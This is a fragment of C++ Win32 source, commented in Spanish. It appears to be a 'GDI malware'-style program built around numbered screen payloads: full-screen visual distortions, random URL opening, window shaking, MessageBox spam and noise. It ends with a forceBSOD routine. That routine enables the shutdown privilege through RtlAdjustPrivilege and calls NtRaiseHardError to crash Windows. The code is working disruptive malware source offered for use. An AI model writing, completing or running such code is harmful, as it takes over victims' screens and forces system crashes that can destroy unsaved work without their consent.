    double angle = t * 0.04;          // Giro lento
    double zoom = 1.0 + sin(t * 0.05) * 0.2;  // Zoom hacia atrás pulsante
    double strength = 1.3;                    // Intensidad del túnel

    // Puntos para PlgBlt (distorsión perspectiva + zoom)
    POINT pts[3];
    pts[0].x = cx - (int)(sw * zoom * 0.6 * cos(angle));
    pts[0].y = cy - (int)(sh * zoom * 0.6 * sin(angle));
    pts[1].x = cx + (int)(sw * zoom * 0.6 * cos(angle + 1.57));
    pts[1].y = cy + (int)(sh * zoom * 0.6 * sin(angle + 1.57));
    pts[2].x = cx + (int)(sw * zoom * 0.6 * cos(angle + 3.14));
    pts[2].y = cy + (int)(sh * zoom * 0.6 * sin(angle + 3.14));

    // Aplica distorsión con PlgBlt (túnel + rotación)
    PlgBlt(hdc, pts, hdcMem, 0, 0, sw, sh, NULL, 0, 0);

    // Tinte caótico (colores shifting como en el video)
    HBRUSH hBrush = CreateSolidBrush(RGB((t * 17) % 255, (t * 37) % 255, (t * 61) % 255));
    HGDIOBJ oldBrush = SelectObject(hdc, hBrush);
    PatBlt(hdc, 0, 0, sw, sh, PATINVERT);  // Inversión parcial para caos
    SelectObject(hdc, oldBrush);
    DeleteObject(hBrush);

    // Ruido ligero (pixelación caótica)
    for (int i = 0; i < 2000; i++) {
        int rx = rand() % sw;
        int ry = rand() % sh;
        SetPixel(hdc, rx, ry, RGB(rand() % 256, rand() % 256, rand() % 256));
    }

    // Limpieza
    SelectObject(hdcMem, old);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

// Payload "3D Burbujas Flotantes" - formas 3D falsas que cambian de color y flotan
// t = tiempo (frame), hdc = contexto de pantalla
void Payload13(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Buffer temporal para dibujar encima
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, sw, sh);
    HGDIOBJ oldBmp = SelectObject(hdcMem, hbmMem);

    // Captura pantalla actual (para que se vea lo que hay detrás)
    BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

    // Número de burbujas (ajusta para más/menos)
    const int numBurbujas = 12;

    for (int i = 0; i < numBurbujas; i++) {
        // Posición flotante (sin(x) y sin(y) para movimiento ondulante)
        double phase = t * 0.02 + i * 1.5;
        int x = (int)(sw / 2 + sin(phase * 1.3 + i) * (sw * 0.4));
        int y = (int)(sh / 2 + cos(phase * 0.9 + i * 2.0) * (sh * 0.3));

        // Tamaño variable (para que parezcan 3D y se acerquen/alejen)
        int radius = 80 + (int)(sin(phase * 0.7 + i) * 40);

        // Colores que cambian (gradiente morado-rosa-verde-azul)
        BYTE r = (BYTE)(128 + sin(t * 0.05 + i * 2.0) * 127);
        BYTE g = (BYTE)(80 + cos(t * 0.06 + i * 1.5) * 100);
        BYTE b = (BYTE)(200 + sin(t * 0.07 + i * 3.0) * 55);

        // Dibuja burbuja con "luz" 3D (círculo + gradiente radial)
        for (int rStep = radius; rStep > 0; rStep -= 8) {
            double bright = 1.0 - (double)(radius - rStep) / radius;  // Más brillante en centro
            BYTE rr = (BYTE)(r * bright);
            BYTE gg = (BYTE)(g * bright);
            BYTE bb = (BYTE)(b * bright);

            HBRUSH br = CreateSolidBrush(RGB(rr, gg, bb));
            HGDIOBJ oldBrush = SelectObject(hdcMem, br);

            HRGN rgn = CreateEllipticRgn(x - rStep, y - rStep, x + rStep, y + rStep);
            SelectClipRgn(hdcMem, rgn);

            // Centro más brillante (efecto 3D)
            Ellipse(hdcMem, x - rStep, y - rStep, x + rStep, y + rStep);

            DeleteObject(rgn);
            SelectObject(hdcMem, oldBrush);
            DeleteObject(br);
        }
    }

    // Copia el resultado con transparencia ligera para que se mezcle con la pantalla
    BLENDFUNCTION blf = { AC_SRC_OVER, 0, 180, 0 };  // 180 = algo transparente
    AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blf);

    // Limpieza
    SelectObject(hdcMem, oldBmp);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

// Payload "Glitch Bandas" - bandas horizontales con colores que se mueven y distorsionan (como en el video)
// t = tiempo (frame), hdc = contexto de pantalla
void Payload14(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Buffer temporal
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, sw, sh);
    HGDIOBJ oldBmp = SelectObject(hdcMem, hbmMem);

    // Captura pantalla
    BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

    // Número de bandas (más = más glitch)
    const int numBandas = 20 + (t % 30);  // Varía para que no sea repetitivo

    for (int i = 0; i < numBandas; i++) {
        // Posición y alto de la banda
        int bandY = (t * 8 + i * (sh / numBandas)) % (sh + 200) - 100;  // Se mueve hacia arriba/abajo
        int bandHeight = 20 + (rand() % 40);                             // Alto random

        // Offset horizontal (distorsión glitch)
        int offsetX = (rand() % 60) - 30 + sin(t * 0.1 + i) * 20;  // Ondulación + random

        // Color de la banda (cambia con tiempo e índice)
        BYTE r = (BYTE)((t * 19 + i * 37) % 255);
        BYTE g = (BYTE)((t * 23 + i * 41) % 255);
        BYTE b = (BYTE)((t * 31 + i * 17) % 255);

        HBRUSH hBrush = CreateSolidBrush(RGB(r, g, b));
        HGDIOBJ oldBrush = SelectObject(hdcMem, hBrush);

        // Dibuja banda con offset (distorsión)
        BitBlt(hdcMem, offsetX, bandY, sw, bandHeight, hdcMem, 0, bandY, SRCCOPY);

        // Inversión parcial para más caos (como en el video)
        PatBlt(hdcMem, offsetX, bandY, sw, bandHeight, PATINVERT);

        SelectObject(hdcMem, oldBrush);
        DeleteObject(hBrush);
    }

    // Ruido ligero (pixelación glitch como en el video)
    for (int i = 0; i < 4000; i++) {  // Ajusta para más/menos ruido
        int rx = rand() % sw;
        int ry = rand() % sh;
        SetPixel(hdcMem, rx, ry, RGB(rand() % 255, rand() % 255, rand() % 255));
    }

    // Copia el resultado a pantalla (con algo de transparencia para mezclar)
    BLENDFUNCTION blf = { AC_SRC_OVER, 0, 220, 0 };  // 220 = casi opaco pero mezcla
    AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blf);

    // Limpieza
    SelectObject(hdcMem, oldBmp);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}
// Payload "Duplicación Spam" - efecto de múltiples copias superpuestas con offset y colores locos
// t = tiempo (frame), hdc = contexto de pantalla
// Payload "Duplicación Spam" - corregido: copias desplazadas con eco, sin terremoto, colores RGB shifting
// t = tiempo (frame), hdc = contexto de pantalla
// Payload "Duplicación Spam" - versión FINAL corregida: copias superpuestas con eco y colores vivos
// t = tiempo (frame), hdc = contexto de pantalla
void Payload15(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Buffer temporal
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, sw, sh);
    HGDIOBJ oldBmp = SelectObject(hdcMem, hbmMem);

    // Captura pantalla original
    BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

    // Número de duplicaciones (más = más spam/eco)
    const int numCopias = 10 + (t % 8);  // 10–18 copias para efecto fuerte

    for (int i = 0; i < numCopias; i++) {
        // Offsets pequeños y ondulantes (para eco/duplicación sin temblor)
        int offsetX = (int)(sin(t * 0.03 + i * 1.8) * 35 + (rand() % 20) - 10);
        int offsetY = (int)(cos(t * 0.04 + i * 2.2) * 35 + (rand() % 20) - 10);

        // Tinte RGB vivo para cada copia (colores que cambian sin lavarse)
        BYTE r = (BYTE)(140 + sin(t * 0.05 + i) * 115);
        BYTE g = (BYTE)(100 + cos(t * 0.06 + i * 1.5) * 100);
        BYTE b = (BYTE)(160 + sin(t * 0.07 + i * 0.9) * 95);

        // Dibuja copia con offset
        BitBlt(hdcMem, offsetX, offsetY, sw, sh, hdcMem, 0, 0, SRCCOPY);

        // Tinte ligero (sin PATINVERT para evitar gris)
        HBRUSH hBrush = CreateSolidBrush(RGB(r, g, b));
        HGDIOBJ oldBrush = SelectObject(hdcMem, hBrush);
        PatBlt(hdcMem, offsetX, offsetY, sw, sh, 0x00AA0029);  // SRCAND + tinte suave
        SelectObject(hdcMem, oldBrush);
        DeleteObject(hBrush);
    }

    // Ruido pixelado colorido (como en el video, sin gris)
    for (int i = 0; i < 4000; i++) {
        int rx = rand() % sw;
        int ry = rand() % sh;
        SetPixel(hdcMem, rx, ry, RGB(rand() % 255, rand() % 255, rand() % 255));
    }

    // Copia con transparencia media para que se vea el "eco" sin tapar
    BLENDFUNCTION blf = { AC_SRC_OVER, 0, 140, 0 };  // 140 = mezcla perfecta para duplicación
    AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blf);

    // Limpieza
    SelectObject(hdcMem, oldBmp);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

// Payload "Fractal Solaris" - efecto fractal Mandelbrot con zoom y colores arcoíris (como en el video)
// t = tiempo (frame), hdc = contexto de pantalla
// Payload "Fractal Persistente" - Mandelbrot con zoom continuo y colores arcoíris
// NO desaparece, se mantiene visible todo el payload
// t = tiempo (frame), hdc = contexto de pantalla
void Payload16(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Buffer persistente (solo se crea una vez, pero como es por frame, lo simulamos)
    static HDC hdcPersistent = NULL;
    static HBITMAP hbmPersistent = NULL;

    if (hdcPersistent == NULL) {
        hdcPersistent = CreateCompatibleDC(hdc);
        hbmPersistent = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcPersistent, hbmPersistent);

        // Fondo inicial negro
        HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
        RECT rect = {0, 0, sw, sh};
        FillRect(hdcPersistent, &rect, black);
        DeleteObject(black);
    }

    // Zoom progresivo: empieza amplio y se acerca lentamente
    double zoom = 1.0 + t * 0.0015;  // Ajusta 0.0015 para velocidad del zoom
    double scale = 4.0 / zoom;

    // Centro del Mandelbrot
    double cx = -0.745;
    double cy = 0.113;

    // Iteraciones (más detalle cuanto más tiempo pasa)
    int maxIter = 60 + (t / 10);  // Aumenta detalle progresivamente

    for (int y = 0; y < sh; y += 2) {  // Paso 2 para más velocidad
        for (int x = 0; x < sw; x += 2) {
            double zx = cx + (x - sw / 2.0) * scale / sw;
            double zy = cy + (y - sh / 2.0) * scale / sh;

            double px = zx;
            double py = zy;
            int iter = 0;

            while (px*px + py*py < 4.0 && iter < maxIter) {
                double xtemp = px*px - py*py + zx;
                py = 2.0 * px * py + zy;
                px = xtemp;
                iter++;
            }

            // Paleta arcoíris vibrante y persistente
            BYTE r, g, b;
            if (iter == maxIter) {
                // Dentro del fractal → azul/negro con brillo
                r = g = 0;
                b = (BYTE)(20 + sin(t * 0.02) * 30);
            } else {
                // Fuera → colores arcoíris
                r = (BYTE)((iter * 9 + t * 5) % 255);
                g = (BYTE)((iter * 13 + t * 7) % 255);
                b = (BYTE)((iter * 17 + t * 9) % 255);
            }

            // Dibuja en buffer persistente
            SetPixel(hdcPersistent, x, y, RGB(r, g, b));
            SetPixel(hdcPersistent, x+1, y, RGB(r, g, b));
            SetPixel(hdcPersistent, x, y+1, RGB(r, g, b));
            SetPixel(hdcPersistent, x+1, y+1, RGB(r, g, b));
        }
    }

    // Copia el fractal persistente a la pantalla (con transparencia ligera)
    BLENDFUNCTION blf = { AC_SRC_OVER, 0, 220, 0 };  // 220 = fuerte pero no tapa todo
    AlphaBlend(hdc, 0, 0, sw, sh, hdcPersistent, 0, 0, sw, sh, blf);
}

void Payload17(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    DWORD ahora = GetTickCount();

    // Abrir URL aleatoria cada 2 segundos (sin Sleep, en hilo aparte)
    if (!g_iniciado || ahora - g_ultimaApertura >= 2000) {
        g_iniciado       = true;
        g_ultimaApertura = ahora;

        int idx = rand() % g_numUrls;
        const char* url = g_urls[idx];

        // Hilo aparte: abre la URL y espera a que cargue antes de escanear
        CreateThread(NULL, 0, [](LPVOID param) -> DWORD {
            const char* u = (const char*)param;
            ShellExecuteA(NULL, "open", u, NULL, NULL, SW_SHOW);
            Sleep(1500);  // espera a que Chrome abra la ventana
            ActualizarListaVentanas();
            return 0;
        }, (LPVOID)url, 0, NULL);
    }

    // Scan extra cada 3 segundos por si quedó alguna sin detectar
    if (ahora - g_ultimoScan >= 3000) {
        g_ultimoScan = ahora;
        ActualizarListaVentanas();
    }

    // Mover ventanas (rebote)
    for (auto& v : g_ventanas) {
        if (!IsWindow(v.hwnd)) continue;

        v.x += v.vx;
        v.y += v.vy;

        if (v.x < 0)        { v.x = 0;        v.vx =  abs(v.vx); }
        if (v.y < 0)        { v.y = 0;        v.vy =  abs(v.vy); }
        if (v.x + v.w > sw) { v.x = sw - v.w; v.vx = -abs(v.vx); }
        if (v.y + v.h > sh) { v.y = sh - v.h; v.vy = -abs(v.vy); }

        SetWindowPos(v.hwnd, HWND_TOPMOST, v.x, v.y, v.w, v.h, SWP_NOACTIVATE);
    }
    // Inversión de colores de pantalla
    BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, NOTSRCCOPY);
}

void Payload18(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    DWORD ahora = GetTickCount();

    // ── Terremoto: mover todas las ventanas del sistema ──
    int intensidad = 20 + (int)(sin(t * 0.3) * 15);  // varía entre 2 y 14px
    int dx = (rand() % (intensidad * 2)) - intensidad;
    int dy = (rand() % (intensidad * 2)) - intensidad;

    // Sacude la pantalla con BitBlt
    BitBlt(hdc, dx, dy, sw, sh, hdc, 0, 0, SRCCOPY);

    // Sacude también todas las ventanas visibles
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
    if (!IsWindowVisible(hwnd)) return TRUE;

    RECT r;
    GetWindowRect(hwnd, &r);
    int* shake = (int*)lParam;
    int ndx = shake[0] * 2;  // el doble de intensidad para todos
    int ndy = shake[1] * 2;

    char cls[64] = {};
    GetClassNameA(hwnd, cls, sizeof(cls));

    // Los MessageBox (#32770) se sacuden el TRIPLE
    if (strcmp(cls, "#32770") == 0) {
        ndx *= 3;
        ndy *= 3;
    }

    SetWindowPos(hwnd, HWND_TOPMOST,
        r.left + ndx, r.top + ndy,
        0, 0,
        SWP_NOSIZE | SWP_NOACTIVATE);
    return TRUE;
}, (LPARAM)(int[]){dx, dy});

    // ── Spam de MessageBox: uno nuevo cada 1.5 segundos ──
    if (ahora - g_ultimoMsg >= 1500) {
        g_ultimoMsg = ahora;
        int idx = rand() % g_numMensajes;
        CreateThread(NULL, 0, MsgBoxThread, (LPVOID)g_mensajes[idx], 0, NULL);
    }
}

void Payload19(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    DWORD ahora = GetTickCount();

    // ── Inversión clásica de colores en toda la pantalla ──
    PatBlt(hdc, 0, 0, sw, sh, PATINVERT);

    // ── Variación opcional: parpadeo más intenso cada cierto tiempo ──
    if ((t % 4) == 0) {  // cada 4 frames (aprox. cada 4 segundos si Sleep(1000))
        // Doble inversión = vuelta a normal + flash rápido
        PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
        PatBlt(hdc, 0, 0, sw, sh, PATINVERT);
    }

    // ── Efecto extra ligero: pequeño tint global cada 3 segundos ──
    if (ahora - g_ultimoTint >= 3000) {
        g_ultimoTint = ahora;

        // Tint aleatorio suave (opcional, puedes comentarlo)
        int r = (rand() % 40) + 215;  // tonos claros
        int g = (rand() % 40) + 215;
        int b = (rand() % 40) + 215;
        HBRUSH brush = CreateSolidBrush(RGB(r, g, b));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, sw, sh, 0x00AA0029);  // PATCOPY con tint suave
        DeleteObject(brush);
    }
}
BOOL CALLBACK EnumChildWindowsProc(HWND hwnd, LPARAM lParam) {
    // Título random (mantienes igual)
    SendMessageTimeout(hwnd, WM_SETTEXT, 0, 
                       (LPARAM)GenRandomUnicodeString(rand() % 10 + 10), 
                       SMTO_ABORTIFHUNG, 100, NULL);

    RECT rc;
    if (!GetWindowRect(hwnd, &rc)) return TRUE;

    int w = rc.right - rc.left;
    int h = rc.bottom - rc.top;
    if (w <= 0 || h <= 0) return TRUE;

    HDC hdc = GetDC(hwnd);
    if (!hdc) return TRUE;

    // Tiempo absoluto (común para todo el sistema → sincronía)
    static ULONGLONG globalStart = GetTickCount64();
    float t = (GetTickCount64() - globalStart) / 1000.0f;

    // Amplitud variable + sinusoidal (muy fluido y natural)
    float amp = 6.0f + sinf(t * 1.8f) * 3.0f;   // varía entre ~3 y 9 px
    int dx = (int)(sinf(t * 22.0f) * amp);
    int dy = (int)(cosf(t * 27.0f + 2.0f) * amp * 0.75f);  // fase diferente

    // Limita para evitar exageración
    dx = std::max(-10, std::min(10, dx));
    dy = std::max(-10, std::min(10, dy));

    // Aplicar temblor con offset inverso (efecto vibración real)
    BitBlt(hdc, dx, dy, w, h, hdc, -dx, -dy, SRCCOPY);

    ReleaseDC(hwnd, hdc);

    // Recursión a hijos
    EnumChildWindows(hwnd, EnumChildWindowsProc, 0);
    return TRUE;
}

// ====================================================================
// WindowsCorruptionPayload – ahora mucho más rápido y fluido
// ====================================================================
DWORD WINAPI WindowsCorruptionPayload(LPVOID lpParameter) {  // ← OBLIGATORIO: DWORD + WINAPI + LPVOID
    for (;;) {
        EnumChildWindows(NULL, EnumChildWindowsProc, 0);
        Sleep(7);
    }
    return 0;   // ← obligatorio, aunque nunca llegue
}

// ====================================================================
// DesktopShakeThread – sincronizado con el tiempo global (más coherente)
// ====================================================================
DWORD WINAPI DesktopShakeThread(LPVOID) {
    HWND progman = FindWindowA("Progman", NULL);
    if (!progman) return 1;

    SendMessageTimeout(progman, 0x052C, 0, 0, SMTO_NORMAL, 1000, NULL);

    HWND workerw = NULL;
EnumWindows([](HWND h, LPARAM lp) -> BOOL {
    // Usa "..." en vez de L"..." porque FindWindowExA espera char*
    HWND shell = FindWindowExA(h, NULL, "SHELLDLL_DefView", NULL);
    if (shell) {
        *(HWND*)lp = FindWindowExA(NULL, h, "WorkerW", NULL);
        return FALSE;  // parar enumeración
    }
    return TRUE;
}, (LPARAM)&workerw);

    if (!workerw) return 1;

    HDC hdcDesk = GetDC(workerw);
    if (!hdcDesk) return 1;

    RECT rc;
    GetClientRect(workerw, &rc);
    int w = rc.right, h = rc.bottom;

    // Usamos el mismo tiempo global que las ventanas
    static ULONGLONG globalStart = GetTickCount64();

    for (;;) {
        float t = (GetTickCount64() - globalStart) / 1000.0f;

        float amp = 7.0f + sinf(t * 1.5f) * 3.5f;   // 3.5–10.5 px
        int dx = (int)(sinf(t * 19.0f) * amp);
        int dy = (int)(cosf(t * 23.0f + 1.8f) * amp * 0.8f);

        dx = std::max(-12, std::min(12, dx));
        dy = std::max(-10, std::min(10, dy));

        BitBlt(hdcDesk, dx, dy, w, h, hdcDesk, -dx, -dy, SRCCOPY);

        Sleep(7);   // misma tasa que las ventanas → todo sincronizado y suave
    }

    ReleaseDC(workerw, hdcDesk);
    return 0;
}
// Mensaje individual (puede ser void o DWORD, pero como lo lanzas en thread, mejor DWORD)
DWORD WINAPI MessageBoxThread(LPVOID lpParameter) {
    LPCWSTR strText  = GenRandomUnicodeString(rand() % 10 + 10);
    LPCWSTR strTitle = GenRandomUnicodeString(rand() % 10 + 10);

    if (rand() % 2 == 0) {
        MessageBoxW(NULL, strText, strTitle, MB_ABORTRETRYIGNORE | MB_ICONWARNING | MB_TOPMOST);
    } else {
        MessageBoxW(NULL, strText, strTitle, MB_RETRYCANCEL | MB_ICONERROR | MB_TOPMOST);
    }
    
    return 0;
}

// Payload principal (el que genera los MessageBox cada 1.5s)
DWORD WINAPI MessageBoxPayload(LPVOID lpParameter) {   // ← LPVOID OBLIGATORIO
    for (;;) {
        CreateThread(NULL, 0, MessageBoxThread, NULL, 0, NULL);
        Sleep(1500);
    }
    
    return 0;   // nunca llega, pero el compilador lo exige
}





//funciones diferentes
void PlayWhiteNoise(int durationMs) {
    const int SAMPLE_RATE = 44100;
    const int CHANNELS = 1;
    const int BITS = 16;
    int numSamples = (SAMPLE_RATE * durationMs) / 1000;

    // Formato de audio
    WAVEFORMATEX wfx = {};
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = CHANNELS;
    wfx.nSamplesPerSec = SAMPLE_RATE;
    wfx.wBitsPerSample = BITS;
    wfx.nBlockAlign = (CHANNELS * BITS) / 8;
    wfx.nAvgBytesPerSec = SAMPLE_RATE * wfx.nBlockAlign;

    // Buffer con muestras aleatorias
    short* buffer = new short[numSamples];
    for (int i = 0; i < numSamples; i++) {
        buffer[i] = (short)(rand() % 65536 - 32768);
    }

    // Abrir dispositivo y reproducir
    HWAVEOUT hWave;
    waveOutOpen(&hWave, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    WAVEHDR hdr = {};
    hdr.lpData = (LPSTR)buffer;
    hdr.dwBufferLength = numSamples * sizeof(short);

    waveOutPrepareHeader(hWave, &hdr, sizeof(hdr));
    waveOutWrite(hWave, &hdr, sizeof(hdr));

    Sleep(durationMs);

    waveOutUnprepareHeader(hWave, &hdr, sizeof(hdr));
    waveOutClose(hWave);
    delete[] buffer;
}

// ====================================================================
// Versión 1: Solo AUDIO + PAYLOAD (sin shader/post-procesamiento de pixeles)
// ====================================================================
void RunPayload(
    int sec,
    AUDIO_SEQUENCE audio,
    void (*payload)(int, HDC)
) {
    AUDIO_PARAMS ap = {8000, 8000 * sec, audio};
    HANDLE hAudio = CreateThread(NULL, 0, AudioThread, &ap, 0, NULL);

    HDC hdc = GetDC(NULL);
    if (!hdc) return;

    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();

    HDC mem = CreateCompatibleDC(hdc);
    if (!mem) {
        ReleaseDC(NULL, hdc);
        return;
    }

    // No necesitamos DIBSection porque no tocamos pixeles directamente
    HBITMAP hbmOrig = (HBITMAP)GetCurrentObject(mem, OBJ_BITMAP);
    // Pero para mantener compatibilidad con payloads que esperan un DC modificable

    DWORD start = GetTickCount();
    int frame = 0;

    while (GetTickCount() - start < (DWORD)(sec * 1000UL)) {
        // Copiamos pantalla real → memoria
        BitBlt(mem, 0, 0, sz.cx, sz.cy, hdc, pt.x, pt.y, SRCCOPY);

        // Aplicamos solo el payload (dibuja sobre el DC de memoria)
        payload(frame, mem);

        // Devolvemos a pantalla
        BitBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, mem, 0, 0, SRCCOPY);

        frame++;
        Sleep(16);  // ~60 fps objetivo
    }

    DeleteDC(mem);
    ReleaseDC(NULL, hdc);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);

    if (hAudio) {
        WaitForSingleObject(hAudio, 10000);
        CloseHandle(hAudio);
    }
}

// 
// 
/* 
void RunShader(
    int sec,
    AUDIO_SEQUENCE audio,
    void (*shader)(int, int, int, RGBQUAD*)
) {
    AUDIO_PARAMS ap = {8000, 8000 * sec, audio};
    HANDLE hAudio = CreateThread(NULL, 0, AudioThread, &ap, 0, NULL);

    HDC hdc = GetDC(NULL);
    if (!hdc) return;

    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = sz.cx;
    bmi.bmiHeader.biHeight      = -sz.cy;    // top-down
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pix = NULL;
    HBITMAP hbm = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pix, NULL, 0);
    if (!hbm || !pix) {
        ReleaseDC(NULL, hdc);
        return;
    }

    HDC mem = CreateCompatibleDC(hdc);
    SelectObject(mem, hbm);

    DWORD start = GetTickCount();
    int frame = 0;

    while (GetTickCount() - start < (DWORD)(sec * 1000UL)) {
        // Captura pantalla → buffer de pixeles
        BitBlt(mem, 0, 0, sz.cx, sz.cy, hdc, pt.x, pt.y, SRCCOPY);

        // Aplicamos shader (modifica pixeles directamente)
        shader(frame, sz.cx, sz.cy, pix);

        // Devolvemos el resultado modificado a pantalla
        BitBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, mem, 0, 0, SRCCOPY);

        frame++;
        Sleep(16);
    }

    DeleteDC(mem);
    DeleteObject(hbm);
    ReleaseDC(NULL, hdc);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);

    if (hAudio) {
        WaitForSingleObject(hAudio, 10000);
        CloseHandle(hAudio);
    }
}*/

void RunPhase(int sec, AUDIO_SEQUENCE audio, void (*shader)(int,int,int,RGBQUAD*), void (*payload)(int,HDC)) {
    AUDIO_PARAMS ap = {8000, 8000 * sec, audio};
    HANDLE hAudio = CreateThread(NULL, 0, AudioThread, &ap, 0, NULL);

    HDC hdc = GetDC(NULL);
    if (!hdc) return;

    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();

    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = sz.cx;
    bmi.bmiHeader.biHeight      = -sz.cy;
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pix = NULL;
    HBITMAP hbm = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pix, NULL, 0);
    if (!hbm || !pix) { ReleaseDC(NULL, hdc); return; }

    HDC mem = CreateCompatibleDC(hdc);
    SelectObject(mem, hbm);

    DWORD start = GetTickCount();
    int frame = 0;

    while (GetTickCount() - start < (DWORD)(sec * 1000UL)) {
        BitBlt(mem, 0, 0, sz.cx, sz.cy, hdc, pt.x, pt.y, SRCCOPY);
        shader(frame, sz.cx, sz.cy, pix);
        payload(frame, mem);
        BitBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, mem, 0, 0, SRCCOPY);
        frame++;
        Sleep(16);
    }

    DeleteDC(mem);
    DeleteObject(hbm);
    ReleaseDC(NULL, hdc);
    RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);

    if (hAudio) {
        WaitForSingleObject(hAudio, 10000);
        CloseHandle(hAudio);
    }
}



void forceBSOD() {
    int crashDelay = 7000 + rand() % 6001;

    static AUDIO_PARAMS ap = {8000, 8000 * 13, AudioSequence6};
    HANDLE hAudio = CreateThread(NULL, 0, AudioThread, &ap, 0, NULL);

    HDC hdc = GetDC(NULL);
    DWORD start = GetTickCount();
    int frame = 0;

    while ((int)(GetTickCount() - start) < crashDelay) {
        Payload9(frame, hdc);
        frame++;
        Sleep(16);
    }

    ReleaseDC(NULL, hdc);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    pRtlAdjustPrivilege RtlAdjustPrivilege =
        (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    pNtRaiseHardError NtRaiseHardError =
        (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    if (!RtlAdjustPrivilege || !NtRaiseHardError) return;

    BOOLEAN bEnabled;
    ULONG uResp;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResp);
}
